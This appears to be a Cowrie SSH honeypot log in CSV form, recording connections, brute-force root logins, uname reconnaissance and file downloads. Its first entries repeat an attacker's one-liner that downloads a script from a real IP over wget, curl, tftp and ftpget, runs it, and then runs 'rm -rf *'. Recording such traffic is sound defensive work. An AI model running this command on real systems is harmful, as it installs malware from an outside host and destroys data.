eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.params,2021-02-12 18:01:20.459523+00:00,64.225.100.21,,df40bea0d41f,,[]
cowrie.command.input,2021-02-12 18:01:20.460396+00:00,64.225.100.21,,df40bea0d41f,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:20.491286+00:00,64.225.100.21,,f237f8bd812f,,[]
cowrie.command.input,2021-02-12 18:01:20.492172+00:00,64.225.100.21,,f237f8bd812f,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:20.687404+00:00,64.225.100.21,,2b149190eac6,,[]
cowrie.command.input,2021-02-12 18:01:20.688298+00:00,64.225.100.21,,2b149190eac6,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:20.727660+00:00,64.225.100.21,,2977d04aa42e,,[]
cowrie.command.input,2021-02-12 18:01:20.728540+00:00,64.225.100.21,,2977d04aa42e,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:20.934233+00:00,64.225.100.21,,cd68e42b4fa1,,[]
cowrie.command.input,2021-02-12 18:01:20.935106+00:00,64.225.100.21,,cd68e42b4fa1,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 18:01:21.124725+00:00,64.225.100.21,,576b823162c6,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.params,2021-02-12 18:01:21.179849+00:00,64.225.100.21,,f170ce10a748,,[]
cowrie.command.input,2021-02-12 18:01:21.180815+00:00,64.225.100.21,,f170ce10a748,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:21.429958+00:00,64.225.100.21,,ec7e61660b1d,,[]
cowrie.command.input,2021-02-12 18:01:21.430898+00:00,64.225.100.21,,ec7e61660b1d,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:21.470433+00:00,64.225.100.21,,a697097da28a,,[]
cowrie.command.input,2021-02-12 18:01:21.471312+00:00,64.225.100.21,,a697097da28a,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:21.780798+00:00,64.225.100.21,,ad9c198d5044,,[]
cowrie.command.input,2021-02-12 18:01:21.781665+00:00,64.225.100.21,,ad9c198d5044,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 18:01:21.821728+00:00,64.225.100.21,,ba52425fafbd,,[]
cowrie.command.input,2021-02-12 18:01:21.822622+00:00,64.225.100.21,,ba52425fafbd,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 18:01:21.834446+00:00,64.225.100.21,,f237f8bd812f,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.836180+00:00,64.225.100.21,,df40bea0d41f,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.837776+00:00,64.225.100.21,,2977d04aa42e,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.839345+00:00,64.225.100.21,,cd68e42b4fa1,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.840936+00:00,64.225.100.21,,45dad8334c0b,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.842531+00:00,64.225.100.21,,07f71d2b7dec,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:21.844143+00:00,64.225.100.21,,2b149190eac6,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:01:22.030341+00:00,64.225.100.21,,576b823162c6,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 18:02:12.273778+00:00,64.225.100.21,,576b823162c6,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download.failed,2021-02-12 18:02:12.278207+00:00,64.225.100.21,,2977d04aa42e,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 18:03:02.513628+00:00,64.225.100.21,,2977d04aa42e,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download.failed,2021-02-12 18:03:02.517132+00:00,64.225.100.21,,45dad8334c0b,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 18:03:52.756485+00:00,64.225.100.21,,45dad8334c0b,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download.failed,2021-02-12 18:03:52.759305+00:00,64.225.100.21,,07f71d2b7dec,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 18:04:43.011853+00:00,64.225.100.21,,07f71d2b7dec,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download.failed,2021-02-12 18:04:43.015841+00:00,64.225.100.21,,2b149190eac6,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 18:05:33.245946+00:00,64.225.100.21,,2b149190eac6,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.closed,2021-02-12 18:05:33.249455+00:00,64.225.100.21,,576b823162c6,254.90989756584167,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.258005+00:00,64.225.100.21,,ad9c198d5044,251.47737407684326,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 251 seconds
cowrie.session.closed,2021-02-12 18:05:33.259220+00:00,64.225.100.21,,ad9c198d5044,254.92424726486206,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.260190+00:00,64.225.100.21,,cd68e42b4fa1,252.32612466812134,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 252 seconds
cowrie.session.closed,2021-02-12 18:05:33.261391+00:00,64.225.100.21,,cd68e42b4fa1,254.92404913902283,Connection lost after 254 seconds
cowrie.session.closed,2021-02-12 18:05:33.262383+00:00,64.225.100.21,,2977d04aa42e,254.9169147014618,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.264818+00:00,64.225.100.21,,f170ce10a748,252.0851447582245,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 252 seconds
cowrie.session.closed,2021-02-12 18:05:33.266010+00:00,64.225.100.21,,f170ce10a748,254.92756128311157,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.266956+00:00,64.225.100.21,,ec7e61660b1d,251.83716750144958,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 251 seconds
cowrie.session.closed,2021-02-12 18:05:33.268174+00:00,64.225.100.21,,ec7e61660b1d,254.92751240730286,Connection lost after 254 seconds
cowrie.session.closed,2021-02-12 18:05:33.269140+00:00,64.225.100.21,,2b149190eac6,254.92628407478333,Connection lost after 254 seconds
cowrie.session.closed,2021-02-12 18:05:33.270115+00:00,64.225.100.21,,07f71d2b7dec,254.92354106903076,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.271063+00:00,64.225.100.21,,ba52425fafbd,251.44948935508728,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 251 seconds
cowrie.session.closed,2021-02-12 18:05:33.272258+00:00,64.225.100.21,,ba52425fafbd,254.9305078983307,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.273196+00:00,64.225.100.21,,a697097da28a,251.80294466018677,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 251 seconds
cowrie.session.closed,2021-02-12 18:05:33.274365+00:00,64.225.100.21,,a697097da28a,254.92669463157654,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.275313+00:00,64.225.100.21,,f237f8bd812f,252.78420162200928,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 252 seconds
cowrie.session.closed,2021-02-12 18:05:33.276490+00:00,64.225.100.21,,f237f8bd812f,254.9321448802948,Connection lost after 254 seconds
cowrie.log.closed,2021-02-12 18:05:33.277444+00:00,64.225.100.21,,df40bea0d41f,252.81809306144714,Closing TTY Log: var/lib/cowrie/tty/d79765ddcb9285a88120f9dc5ad20ecf637bb59391cc5b75ccaa767430f65a7d after 252 seconds
cowrie.session.closed,2021-02-12 18:05:33.278613+00:00,64.225.100.21,,df40bea0d41f,254.9447844028473,Connection lost after 254 seconds
cowrie.session.closed,2021-02-12 18:05:33.279570+00:00,64.225.100.21,,45dad8334c0b,254.94335675239563,Connection lost after 254 seconds
cowrie.session.connect,2021-02-12 18:20:29.214477+00:00,221.181.185.19,155.232.195.82,7878c54eb920,,New connection: 221.181.185.19:42486 (155.232.195.82:2222) [session: 7878c54eb920]
cowrie.client.version,2021-02-12 18:20:29.216213+00:00,221.181.185.19,,7878c54eb920,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 18:20:29.521754+00:00,221.181.185.19,155.232.195.83,765f456aad69,,New connection: 221.181.185.19:39037 (155.232.195.83:2222) [session: 765f456aad69]
cowrie.client.version,2021-02-12 18:20:29.522921+00:00,221.181.185.19,,765f456aad69,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 18:20:30.029506+00:00,221.181.185.19,,7878c54eb920,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 18:20:30.595599+00:00,221.181.185.19,,765f456aad69,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 18:20:33.485672+00:00,221.181.185.19,,7878c54eb920,4.26958703994751,Connection lost after 4 seconds
cowrie.session.closed,2021-02-12 18:20:34.549105+00:00,221.181.185.19,,765f456aad69,5.026256561279297,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 18:31:36.061587+00:00,129.150.172.40,155.232.195.82,26793f14822a,,New connection: 129.150.172.40:61196 (155.232.195.82:2222) [session: 26793f14822a]
cowrie.session.closed,2021-02-12 18:31:36.443013+00:00,129.150.172.40,,26793f14822a,0.37982511520385703,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 18:33:29.750569+00:00,212.126.127.50,155.232.195.83,d58056c91bd4,,New connection: 212.126.127.50:55319 (155.232.195.83:2222) [session: d58056c91bd4]
cowrie.client.version,2021-02-12 18:33:29.753500+00:00,212.126.127.50,,d58056c91bd4,,Remote SSH version: b'SSH-2.0-libssh2_1.4.1'
cowrie.client.kex,2021-02-12 18:33:30.065916+00:00,212.126.127.50,,d58056c91bd4,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 18:33:40.070558+00:00,212.126.127.50,,d58056c91bd4,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 18:33:41.386264+00:00,212.126.127.50,,d58056c91bd4,11.634322881698608,Connection lost after 11 seconds
cowrie.session.connect,2021-02-12 18:56:35.004155+00:00,221.181.185.220,155.232.195.83,8e557c60d5e1,,New connection: 221.181.185.220:55806 (155.232.195.83:2222) [session: 8e557c60d5e1]
cowrie.client.version,2021-02-12 18:56:35.005913+00:00,221.181.185.220,,8e557c60d5e1,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 18:56:35.140438+00:00,221.181.185.220,155.232.195.82,aa8fb1f94f89,,New connection: 221.181.185.220:50706 (155.232.195.82:2222) [session: aa8fb1f94f89]
cowrie.client.version,2021-02-12 18:56:35.141950+00:00,221.181.185.220,,aa8fb1f94f89,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 18:56:35.652376+00:00,221.181.185.220,,8e557c60d5e1,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 18:56:35.893342+00:00,221.181.185.220,,aa8fb1f94f89,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 18:56:38.404624+00:00,221.181.185.220,,8e557c60d5e1,3.398848056793213,Connection lost after 3 seconds
cowrie.session.closed,2021-02-12 18:56:40.564368+00:00,221.181.185.220,,aa8fb1f94f89,5.42249321937561,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 19:15:12.372778+00:00,212.126.127.50,155.232.195.82,7593a38db4d3,,New connection: 212.126.127.50:48317 (155.232.195.82:2222) [session: 7593a38db4d3]
cowrie.client.version,2021-02-12 19:15:12.374502+00:00,212.126.127.50,,7593a38db4d3,,Remote SSH version: b'SSH-2.0-libssh2_1.4.1'
cowrie.client.kex,2021-02-12 19:15:12.688473+00:00,212.126.127.50,,7593a38db4d3,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 19:15:19.301244+00:00,212.126.127.50,,7593a38db4d3,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 19:15:20.621225+00:00,212.126.127.50,,7593a38db4d3,8.246862649917603,Connection lost after 8 seconds
cowrie.session.connect,2021-02-12 19:31:57.683774+00:00,221.181.185.220,155.232.195.82,f66e6c2c34b8,,New connection: 221.181.185.220:50700 (155.232.195.82:2222) [session: f66e6c2c34b8]
cowrie.client.version,2021-02-12 19:31:57.685546+00:00,221.181.185.220,,f66e6c2c34b8,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 19:31:59.650663+00:00,221.181.185.220,155.232.195.83,4bb6668e6b8a,,New connection: 221.181.185.220:55786 (155.232.195.83:2222) [session: 4bb6668e6b8a]
cowrie.client.version,2021-02-12 19:31:59.652395+00:00,221.181.185.220,,4bb6668e6b8a,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 19:32:00.184144+00:00,221.181.185.220,,4bb6668e6b8a,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 19:32:01.842749+00:00,221.181.185.220,,f66e6c2c34b8,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 19:32:02.310941+00:00,221.181.185.220,,4bb6668e6b8a,2.658683776855468,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 19:32:05.370906+00:00,221.181.185.220,,f66e6c2c34b8,7.685469150543213,Connection lost after 7 seconds
cowrie.session.connect,2021-02-12 19:33:27.790122+00:00,209.141.51.170,155.232.195.82,0438d6793660,,New connection: 209.141.51.170:56198 (155.232.195.82:2222) [session: 0438d6793660]
cowrie.session.closed,2021-02-12 19:33:28.090423+00:00,209.141.51.170,,0438d6793660,0.298736572265625,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 20:07:09.280206+00:00,221.181.185.220,155.232.195.83,b347653cc6bd,,New connection: 221.181.185.220:50737 (155.232.195.83:2222) [session: b347653cc6bd]
cowrie.client.version,2021-02-12 20:07:09.281916+00:00,221.181.185.220,,b347653cc6bd,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 20:07:09.317570+00:00,221.181.185.220,155.232.195.82,02daec90d5c1,,New connection: 221.181.185.220:45687 (155.232.195.82:2222) [session: 02daec90d5c1]
cowrie.client.version,2021-02-12 20:07:09.319094+00:00,221.181.185.220,,02daec90d5c1,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 20:07:09.807286+00:00,221.181.185.220,,b347653cc6bd,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 20:07:09.858994+00:00,221.181.185.220,,02daec90d5c1,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 20:07:12.564210+00:00,221.181.185.220,,02daec90d5c1,3.245191097259521,Connection lost after 3 seconds
cowrie.session.closed,2021-02-12 20:07:13.180578+00:00,221.181.185.220,,b347653cc6bd,3.898804903030395,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 20:14:02.036573+00:00,212.126.127.50,155.232.195.83,bf7d52fa2ec5,,New connection: 212.126.127.50:33835 (155.232.195.83:2222) [session: bf7d52fa2ec5]
cowrie.client.version,2021-02-12 20:14:02.038303+00:00,212.126.127.50,,bf7d52fa2ec5,,Remote SSH version: b'SSH-2.0-libssh2_1.4.1'
cowrie.client.kex,2021-02-12 20:14:02.353615+00:00,212.126.127.50,,bf7d52fa2ec5,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 20:14:08.261939+00:00,212.126.127.50,,bf7d52fa2ec5,,login attempt [root/0] succeeded
cowrie.session.params,2021-02-12 20:14:08.931711+00:00,212.126.127.50,,bf7d52fa2ec5,,[]
cowrie.command.input,2021-02-12 20:14:08.932582+00:00,212.126.127.50,,bf7d52fa2ec5,,CMD: uname -a -v -n
cowrie.log.closed,2021-02-12 20:14:09.251346+00:00,212.126.127.50,,bf7d52fa2ec5,0.319797754287719,Closing TTY Log: var/lib/cowrie/tty/12c3558dcef4009884d24b19a120546147290a934205f9d63b37a72260a8c406 after 0 seconds
cowrie.session.closed,2021-02-12 20:14:09.253150+00:00,212.126.127.50,,bf7d52fa2ec5,7.214990139007568,Connection lost after 7 seconds
cowrie.session.connect,2021-02-12 20:20:25.457718+00:00,188.166.106.32,155.232.195.83,7058d017b423,,New connection: 188.166.106.32:40210 (155.232.195.83:2222) [session: 7058d017b423]
cowrie.session.connect,2021-02-12 20:20:25.459057+00:00,188.166.106.32,155.232.195.82,6f07547dae46,,New connection: 188.166.106.32:48892 (155.232.195.82:2222) [session: 6f07547dae46]
cowrie.session.closed,2021-02-12 20:20:25.642216+00:00,188.166.106.32,,6f07547dae46,0.18215322494506803,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 20:20:25.643602+00:00,188.166.106.32,,7058d017b423,0.18480420112609802,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 20:46:00.898096+00:00,192.241.219.146,155.232.195.83,3a716bb69be3,,New connection: 192.241.219.146:52186 (155.232.195.83:2222) [session: 3a716bb69be3]
cowrie.client.version,2021-02-12 20:46:00.899299+00:00,192.241.219.146,,3a716bb69be3,,Remote SSH version: b'SSH-2.0-Go'
cowrie.client.kex,2021-02-12 20:46:01.154656+00:00,192.241.219.146,,3a716bb69be3,,SSH client hassh fingerprint: 2aec6b44b06bec95d73f66b5d30cb69a
cowrie.session.connect,2021-02-12 20:46:09.348254+00:00,192.241.219.146,155.232.195.82,5c26ce346cd9,,New connection: 192.241.219.146:49832 (155.232.195.82:2222) [session: 5c26ce346cd9]
cowrie.client.version,2021-02-12 20:46:09.349432+00:00,192.241.219.146,,5c26ce346cd9,,Remote SSH version: b'SSH-2.0-Go'
cowrie.client.kex,2021-02-12 20:46:09.596266+00:00,192.241.219.146,,5c26ce346cd9,,SSH client hassh fingerprint: 2aec6b44b06bec95d73f66b5d30cb69a
cowrie.session.closed,2021-02-12 20:46:10.898271+00:00,192.241.219.146,,3a716bb69be3,9.999055862426758,Connection lost after 9 seconds
cowrie.session.closed,2021-02-12 20:46:19.348504+00:00,192.241.219.146,,5c26ce346cd9,9.999172687530518,Connection lost after 9 seconds
cowrie.session.connect,2021-02-12 20:56:06.016928+00:00,212.126.127.50,155.232.195.82,e95f38b0c1a2,,New connection: 212.126.127.50:55647 (155.232.195.82:2222) [session: e95f38b0c1a2]
cowrie.client.version,2021-02-12 20:56:06.018605+00:00,212.126.127.50,,e95f38b0c1a2,,Remote SSH version: b'SSH-2.0-libssh2_1.4.1'
cowrie.client.kex,2021-02-12 20:56:06.336387+00:00,212.126.127.50,,e95f38b0c1a2,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 20:56:12.277057+00:00,212.126.127.50,,e95f38b0c1a2,,login attempt [root/0] succeeded
cowrie.session.params,2021-02-12 20:56:13.050769+00:00,212.126.127.50,,e95f38b0c1a2,,[]
cowrie.command.input,2021-02-12 20:56:13.051632+00:00,212.126.127.50,,e95f38b0c1a2,,CMD: uname -a -v -n
cowrie.log.closed,2021-02-12 20:56:13.366193+00:00,212.126.127.50,,e95f38b0c1a2,0.315590143203735,Closing TTY Log: var/lib/cowrie/tty/12c3558dcef4009884d24b19a120546147290a934205f9d63b37a72260a8c406 after 0 seconds
cowrie.session.closed,2021-02-12 20:56:13.368020+00:00,212.126.127.50,,e95f38b0c1a2,7.34952187538147,Connection lost after 7 seconds
cowrie.session.connect,2021-02-12 21:16:23.976322+00:00,221.181.185.135,155.232.195.83,daef1b004ebc,,New connection: 221.181.185.135:19542 (155.232.195.83:2222) [session: daef1b004ebc]
cowrie.client.version,2021-02-12 21:16:23.978034+00:00,221.181.185.135,,daef1b004ebc,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 21:16:23.986922+00:00,221.181.185.135,155.232.195.82,7eee5b98dbca,,New connection: 221.181.185.135:29705 (155.232.195.82:2222) [session: 7eee5b98dbca]
cowrie.client.version,2021-02-12 21:16:23.988088+00:00,221.181.185.135,,7eee5b98dbca,,Remote SSH version: b'SSH-2.0-PUTTY'
